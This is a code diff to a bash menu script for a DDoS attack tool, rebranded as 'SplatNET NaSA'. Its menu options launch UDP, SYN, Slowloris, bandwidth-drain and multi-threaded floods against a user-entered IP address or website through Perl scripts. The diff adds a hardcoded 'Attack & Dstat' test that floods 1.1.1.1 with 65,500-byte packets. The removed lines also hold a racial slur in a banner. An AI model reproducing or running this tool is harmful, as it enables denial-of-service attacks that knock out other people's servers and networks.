@@ -18,8 +18,8 @@ WHITE='\e[1;37m'
 NC='\e[0m'              # No Color
 # Trap Signal Script
 #
-#TitaniumScript.bypass//BASH  Bypass.Function $invisible.inv
-#
+#TitaniumScript.bypass//BASH  Bypass.Function
+#load
 exit_script()
 {
   echo "* * *Trap * * *"
@@ -37,21 +37,36 @@ dstat
     
 }
 
+admin12()
+{
+    clear
+    echo -e " ${CYAN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                          ADMIN PANEL                              ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+echo "Im Sure You Can Create Your Own Panel :3"
+echo "If You Really Dont Know How You Can Contact Me On Skype"
+echo "My Skype Is Not Very Hard To Find"
+read ok
+clear
+    
+}
+
 udp_flooda()
 {
     clear
     echo -e " ${BLUE} "
 	echo "  +-----------------------------------------------------------------------+ "
-    echo "  ¦¦¦                         PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "                                                         
-    echo -e "  ¦¦¦${CYAN}                              SplatGamer$${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                              SplatNET NaSA${CYAN}                             ¦¦¦ " 
     echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
     echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
-    echo -e "  ¦¦¦${BLUE}                            SplatGamer${GREEN}                          ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            SplatNET NaSA${GREEN}                          ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "
     echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
     echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
-    echo "  ¦¦¦                              UDP NIGGER	¦¦¦ "
+    echo "  ¦¦¦                              UDP SplatNET NaSA                            ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "
 echo "Enter target ip please :"
 read ip
@@ -67,12 +82,12 @@ udp_floodb()
     clear
     echo -e " ${BLUE} "
 	echo "  +-----------------------------------------------------------------------+ "
-    echo "  ¦¦¦                         PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "                                                         
-    echo -e "  ¦¦¦${CYAN}                              SplatGamer${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                              SplatNET NaSA${CYAN}                             ¦¦¦ " 
     echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
     echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
-    echo -e "  ¦¦¦${BLUE}                            MODZ SplatGamer${GREEN}                          ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            SplatGamer${GREEN}                          ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "
     echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
     echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
@@ -92,16 +107,16 @@ slap()
     clear
     echo -e " ${BLUE} "
 	echo "  +-----------------------------------------------------------------------+ "
-    echo "  ¦¦¦                         PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "                                                         
-    echo -e "  ¦¦¦${CYAN}                              SplatGamer${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                              SplatNET NaSA${CYAN}                             ¦¦¦ " 
     echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
     echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
-    echo -e "  ¦¦¦${BLUE}                            MODZ SplatGamer${GREEN}                          ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            SplatGamer${GREEN}                          ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "
     echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
     echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
-    echo "  ¦¦¦                            GoTT THRAXX                             ¦¦¦ "
+    echo "  ¦¦¦                            GoTT SplatNET NaSA                             ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "
 echo "Enter target ip please :"
 read ip
@@ -113,16 +128,16 @@ slowloris()
     clear
     echo -e " ${BLUE} "
 	echo "  +-----------------------------------------------------------------------+ "
-    echo "  ¦¦¦                         PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "                                                         
-    echo -e "  ¦¦¦${CYAN}                              SplatGamer${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                              SplatNET NaSA${CYAN}                             ¦¦¦ " 
     echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
     echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
     echo -e "  ¦¦¦${BLUE}                            SplatGamer${GREEN}                          ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "
     echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
     echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
-    echo "  ¦¦¦                        Slowloris THRAXX                             ¦¦¦ "
+    echo "  ¦¦¦                        Slowloris SplatNET NaSA                             ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "
 echo "To stop this script after execution hold [CTRL] + [C]"
 echo "Enter website address :"
@@ -137,12 +152,12 @@ killall()
     clear
     echo -e " ${BLUE} "
 	echo "  +-----------------------------------------------------------------------+ "
-    echo "  ¦¦¦                         PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "                                                         
-    echo -e "  ¦¦¦${CYAN}                              SplatGamer${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                              SplatNET NaSA${CYAN}                             ¦¦¦ " 
     echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
     echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
-    echo -e "  ¦¦¦${BLUE}                            MODZ SplatGamer${GREEN}                          ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            SplatGamer${GREEN}                          ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "
     echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
     echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
@@ -158,20 +173,58 @@ fry()
     clear
     echo -e " ${BLUE} "
 	echo "  +-----------------------------------------------------------------------+ "
-    echo "  ¦¦¦                         PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "                                                         
-    echo -e "  ¦¦¦${CYAN}                              SplatGamer${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                              SplatNET NaSA${CYAN}                             ¦¦¦ " 
     echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
     echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
-    echo -e "  ¦¦¦${BLUE}                            MODZ SplatGamer${GREEN}                         ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            SplatGamer${GREEN}                         ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "
     echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
     echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
-    echo "  ¦¦¦             SUPER Nitrous BY SplatGamer STOP WITH CTRL+C              ¦¦¦ "
+    echo "  ¦¦¦             SUPER Nytro STOP WITH CTRL+C              ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "
-echo "Private command you cannot use it ! Press Enter"
-read enter
+echo "Enter IP Address :"
+read ip
+echo "Enter Port :"
+read port
+echo "Enter size :"
+read size
+echo "Enter the time in seconds :"
+read time
+perl nytro.pl $ip $port $size $time
 
+}
+
+and()
+{
+    clear
+    echo -e " ${BLUE} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+    echo -e "  ¦¦¦${CYAN}                              SplatNET NaSA${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                               SplatNET NaSA${GREEN}                           ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+    echo "  ¦¦¦                           Version 2.0                             ¦¦¦ "
+    echo "  ¦¦¦+-----------------------------------------------------------------+¦¦¦ " 
+    echo "  ¦¦¦                     Attack And Dstat Cant be stop                 ¦¦¦ "
+    echo "  +-----------------------------------------------------------------------+ "
+echo "Note : This Script Will Show You Your Power"
+echo "The Test Is Only 20 Seconds After You Stop Dstat With CTRL+C"
+echo "Press Enter :)"
+read enter
+perl nytro.pl 1.1.1.1 80 65500 20 & dstat
+
+}
+
+autoinstall()
+{
+
+clear
+./install
 }
 
 bw()
@@ -179,16 +232,16 @@ bw()
     clear
     echo -e " ${BLUE} "
 	echo "  +-----------------------------------------------------------------------+ "
-    echo "  ¦¦¦                         PRIVATE VERSION 1.0 !                      ¦¦¦ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "                                                         
-    echo -e "  ¦¦¦${CYAN}                              SplatGamer${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                              SplatNET NaSA${CYAN}                             ¦¦¦ " 
     echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
     echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
-    echo -e "  ¦¦¦${BLUE}                            MODZ SplatGamer${GREEN}                          ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            SplatGamer${GREEN}                          ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "
     echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
     echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
-    echo "  ¦¦¦                    Bandwidth Drain THRAXX                     ¦¦¦ "
+    echo "  ¦¦¦                    Bandwidth Drain SplatNET NaSA                     ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "
 echo "Enter target ip please :"
 read ip
@@ -203,8 +256,8 @@ multi()
 {
     clear
     echo -e " $CYAN} "
-    echo "               SplatGamer MULTI FLOOD UPDATED "   
-    echo "Script created by SplatGamer and get updated by Rhys"
+    echo "               SplatNET NaSA MULTI FLOOD UPDATED "   
+    echo "Script"
     echo ""	
     echo -e "        '||    ||'          '||    .    || " 
     echo -e "         |||  |||  ... ...   ||  .||.  ...  "
@@ -226,7 +279,7 @@ echo "Enter the thread count :"
 read threads
 echo "Would you like to see the output WARNING if yes flood may slow down! 0=No 1=Yes"
 read output
-perl cgi-bin.pl $ip $port $size $time $threads $output
+perl multi.pl $ip $port $size $time $threads $output
 }
 
 syn()
@@ -234,12 +287,12 @@ syn()
     clear
     echo -e " ${BLUE} "
 	echo "  +-----------------------------------------------------------------------+ "
-    echo "  ¦¦¦                         PUBLIC VERSION 1.0 !                      ¦¦¦ "
+    echo "  ¦¦¦                        PRIVATE VERSION 1.0 !                      ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "                                                         
-    echo -e "  ¦¦¦${CYAN}                              SplatGamer${CYAN}                             ¦¦¦ " 
+    echo -e "  ¦¦¦${CYAN}                              SplatNET NaSA${CYAN}                             ¦¦¦ " 
     echo -e "  ¦¦¦${CYAN}                               SCRIPT${CYAN}                              ¦¦¦ " 
     echo -e "  ¦¦¦${CYAN}                                 BY${BLUE}                                ¦¦¦ "
-    echo -e "  ¦¦¦${BLUE}                            MODZ SplatGamer${GREEN}                          ¦¦¦ "
+    echo -e "  ¦¦¦${BLUE}                            SplatGamer${GREEN}                          ¦¦¦ "
     echo "  +-----------------------------------------------------------------------+ "
     echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
     echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
@@ -263,44 +316,47 @@ clear
 while :
 do
 clear
-echo -e "${WHITE}Created By SplatGamer${RED}                           User:"${LIGHTBLUE}ADMINISTRATOR "${RED}Expires:"${LIGHTBLUE}PRIVATE
-echo -e "${WHITE}                                               PRIVATE MENU 1.0 ENJOY
-                                        "${WHITE}Your Version: "${GREEN}v1.0 "${RED}[PRIVATE version]
+echo -e "${WHITE}SplatNET NaSA${RED}                           User:"${LIGHTBLUE}$(whoami)"${RED}Expires:"${LIGHTBLUE}Lifetime
+echo -e "${WHITE}                                                PRIVATE MENU 6.0 ENJOY
+Bypass [${GREEN}ON${WHITE}]                             "${WHITE}Your Version: "${GREEN}v6.0 "${RED}[Private Verison]
 echo -e "${WHITE}
-   #   P   r   o   j   e   c   t           ProjectSplatGamer Public Release ${WHITE}
-  / \ / \ / \ / \ / \ / \ / \ / \         --------------------------------${CYAN}
- ( S | K | I | D | D | E | R | Z )${LIGHTBLUE}        ¦VPS: RAM 9GO BANDWICH: 16GBPS  ¦${WHITE}
-  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/         --------------------------------
+                                               ProjectTOL12 Private 1.0 ${WHITE}
+  / \ / \ / \ / \ / \ / \                    -------------------------------------${CYAN}
+ ( W | E | B | 0 | 0 | T |      ${LIGHTBLUE}        ¦ You are connected to SplatNET NaSA ¦${WHITE}
+  \_/ \_/ \_/ \_/ \_/ \_/                    -------------------------------------
 "${WHITE}
-    echo -e "${WHITE}Note: "${GREEN}TO EXIT A SCRIPT OR STOP ATTACKS PRESS [CTRL+C]
-    echo""
-	echo -e "${LIGHTBLUE}[1]${GREEN}UDP Flood${LIGHTBLUE}                            [11] ADMIN DSTAT "                                                                                         																									
-    echo -e "${LIGHTBLUE}[2]${GREEN}UDP Flood B${RED}                          "
-    echo -e "${LIGHTBLUE}[3]${GREEN}Xtreme FlooD${RED}                         "
-    echo -e "${LIGHTBLUE}[4]${GREEN}SLOWLORIS${RED}                            "
-    echo -e "${LIGHTBLUE}[5]${RED}VIP SCRIPT${BLUE}" 
-    echo -e "${LIGHTBLUE}[6]${GREEN}Bandwidth${BLUE}"
-    echo -e "${LIGHTBLUE}[7]${GREEN}SyN Flood${BLUE}"
-    echo -e "${LIGHTBLUE}[8]${GREEN}Kill Attacks${BLUE}"
-    echo -e "${LIGHTBLUE}[9]${LIGHTBLUE}Change Password${CYAN}"
-	echo -e "${LIGHTBLUE}[10]${LIGHTBLUE}MULTI UPDATED${CYAN}"
-    echo -e "                                                              Bypass [${GREEN}ON${CYAN}]"
-    echo -n "#ProjectSplatGamer - Enter your menu choice [1-11]: "
+    echo -e "${WHITE}Note: "${GREEN}TO EXIT A SCRIPT OR STOP ATTACKS PRESS [CTRL+C] KILL ALL ATTACKS WITH 14
+    echo -e "${GREEN}[==============================================================================]"
+	echo -e "${LIGHTBLUE}[1]${GREEN}UDP Flood${LIGHTBLUE}                                             [5]${GREEN}Bandwidth${LIGHTBLUE}"                                                                                         																									
+    echo -e "${LIGHTBLUE}[2]${GREEN}UDP Flood B${LIGHTBLUE}                                           [6]${GREEN}SyN Flood${BLUE}"
+    echo -e "${LIGHTBLUE}[3]${GREEN}Xtreme FlooD${LIGHTBLUE}                                          [7]${LIGHTBLUE}MULTI UPDATED${CYAN}"
+    echo -e "${LIGHTBLUE}[4]${GREEN}SLOWLORIS${LIGHTBLUE}                                             [8]${GREEN}SplatNET NaSA SCRIPT${LIGHTBLUE}"
+    echo -e ""                                                                 
+    echo -e "${PURPLE}[==============================================================================]"
+    echo -e "${PURPLE}                                 ~OPTIONS~                                      "
+    echo -e "${LIGHTBLUE}[9]${GREEN}Change Password${LIGHTBLUE}                                       [AI]${GREEN}Installer"
+	echo -e "${LIGHTBLUE}[10]${GREEN}Dstat${LIGHTBLUE}                                                [12]${GREEN}Admin Panel"
+	echo -e "${LIGHTBLUE}[11]${GREEN}Attack & Dstat${LIGHTBLUE}                                       [13]${GREEN}Exit Menu"
+    echo -e ""
+    echo -n "#SplatNET NaSA - Menu [1-13-AI]: "
     read yourch
     case $yourch in
       1) udp_flooda ;;
       2) udp_floodb ;;
       3) slap ;;
 	  4) slowloris ;;
-	  5) fry ;;
-         6) bw ;;
-         7) syn ;;
-	  8) killall ;;
+	  8) fry ;;
+         5) bw ;;
+         6) syn ;;
+	  14) killall ;;
 	  9) passwd ;;
-	  10) multi ;;
-	  11) dstat1 ;;
+	  7) multi ;;
+	  10) dstat1 ;;
+	  11) and ;;
+	  12) admin12 ;;
+	  AI) autoinstall ;;
       ex) echo "As you Command" ;  exit 1  ;;
-	  end) pkill menu  ;;
+	  13) pkill menu  ;;
       *) echo "Invalid Selection, Please make another selection between [1-11]" ;
          echo "Press Enter. . ." ; read ;;
  esac
